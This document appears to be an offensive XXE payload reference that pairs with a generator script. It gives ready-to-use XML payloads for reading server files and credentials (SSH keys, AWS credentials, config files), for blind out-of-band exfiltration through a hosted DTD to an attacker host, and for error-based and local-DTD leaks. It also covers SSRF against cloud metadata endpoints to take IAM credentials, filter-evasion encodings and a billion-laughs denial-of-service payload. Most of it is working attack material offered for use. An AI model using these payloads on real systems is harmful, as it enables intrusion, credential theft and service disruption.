# XXE Payload Reference

All payloads below are emitted by `scripts/gen_xxe.py` with your file/callback
substituted. `ATTACKER` = your host (e.g. `198.51.100.7` or `cbx7.oast.pro`).

## 1. Detection

Internal entity (no network — proves DTD/entity expansion):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x "xxeprobe31337">]>
<r>&x;</r>
```

External resolution probe (general entity, reflected or not):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://probe1.ATTACKER/x">]>
<r>&xxe;</r>
```

Parameter-entity probe (works even when general entities are forbidden in
content, e.g. SOAP bodies):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://probe2.ATTACKER/x"> %p;]>
<r>x</r>
```

## 2. Classic in-band file read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r><reflected>&xxe;</reflected></r>
```

Windows:

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
```

Target files worth iterating:
```
/etc/passwd /etc/hosts /etc/shadow(if root) /proc/self/environ /proc/self/cmdline
/root/.ssh/id_rsa /home/*/.ssh/id_rsa ~/.aws/credentials
/var/www/html/config.php  /var/www/html/wp-config.php
WEB-INF/web.xml (relative, Java)  META-INF/context.xml
c:/windows/win.ini  c:/inetpub/wwwroot/web.config  c:/Users/*/.aws/credentials
```

## 3. PHP filter wrapper (PHP targets)

Base64 survives XML (no `<` `&`), so it reads source code and multiline/binary
files in-band:

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<r>&xxe;</r>

<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]>
```

Decode: `echo '<b64>' | base64 -d`. Also useful:
`php://filter/read=convert.quoted-printable-encode/resource=...`.

## 4. Blind OOB exfiltration (parameter entities + hosted DTD)

In-request half:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://ATTACKER/exfil.dtd">
  %ext; %wrap; %send;
]>
<r>x</r>
```

Hosted `exfil.dtd` — HTTP channel (`&#x25;` is the escaped `%` required when
defining an entity inside an entity value; the nested definition is only legal
because this DTD is *external*):

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/leak?d=%file;'>">
```

Read the data from your HTTP log / interactsh `http` interaction
(`GET /leak?d=root:x:0:0:...`). Newlines/spaces in the file break the URL on
many stacks — fixes:

- **php://filter the file first** (PHP):
  `<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
- **FTP channel** (Java — FTP tolerates newlines; each line arrives as a
  separate FTP command): change `send` to
  `'ftp://ATTACKER:2121/%file;'` and run an FTP catcher (xxeftp /
  XXEinjector's built-in `--oob=ftp`).

## 5. Error-based leak (no exfil egress needed for the data)

Hosted `error.dtd`:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
```

Request as in §4 but reference `%err;`. The parse error echoes the path —
i.e. the file content:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...
```

**Fully blind, zero egress — local DTD redefinition.** Abuse a DTD already on
the target filesystem and redefine one of its parameter entities:

```xml
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval; &#x25;err;'>
  %local_dtd;
]>
<r>x</r>
```

Common local DTD paths to brute: `/usr/share/yelp/dtd/docbookx.dtd` (GNOME),
`/usr/share/xml/fontconfig/fonts.dtd`,
`C:\Windows\System32\wbem\xml\cim20.dtd`. (Automate candidates with the
"dtd-finder" wordlists.)

## 6. SSRF via XXE

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<r>&xxe;</r>
```

Iterate:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
http://169.254.169.254/latest/user-data
http://100.100.100.200/latest/meta-data/            (Alibaba)
http://192.0.2.10:8080/  http://127.0.0.1:8000/     (internal services)
```

Notes: AWS IMDSv2, GCP, and Azure require custom headers you cannot set via a
bare SYSTEM entity — IMDSv1 and Alibaba are the standard XXE wins. interactsh's
built-in `aws.oast.fun` → 169.254.169.254 and `alibaba.oast.fun` →
100.100.100.200 rebinds help when the parser follows redirects or you need a
resolvable hostname. Blind SSRF port-scan: time/error-differential across
`http://192.0.2.10:PORT/` entities.

Other schemes by platform: `jar:http://ATTACKER/x.jar!/` (Java — also keeps a
temp file on disk), `gopher://` (very old Java/PHP), `expect://id` (PHP with
expect extension — direct RCE), `data://` (PHP).

## 7. XInclude (when you control a field, not the whole document)

Server builds the XML around your value → you can't add a DOCTYPE. Inject:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## 8. Encoding/WAF bypasses

- UTF-16 body: `cat payload.xml | iconv -f UTF-8 -t UTF-16BE` with
  `<?xml version="1.0" encoding="UTF-16"?>` — slips DOCTYPE-string filters.
- UTF-7 on ancient parsers.
- Whitespace in `<!DOCTYPE\nr\n[` and entity names; mixed case `<!DocType`.
- Parameter entities when general-entity usage is blocked, and vice versa.

## 9. DoS note (entity expansion)

Billion laughs (`<!ENTITY a1 "&a0;&a0;...">` chains) and external-entity quadratic
blowup confirm entity processing loudly and can take the parser down — know the
shape, use deliberately:

```xml
<!DOCTYPE r [<!ENTITY a0 "lol"><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;"> ... ]>
<r>&a9;</r>
```
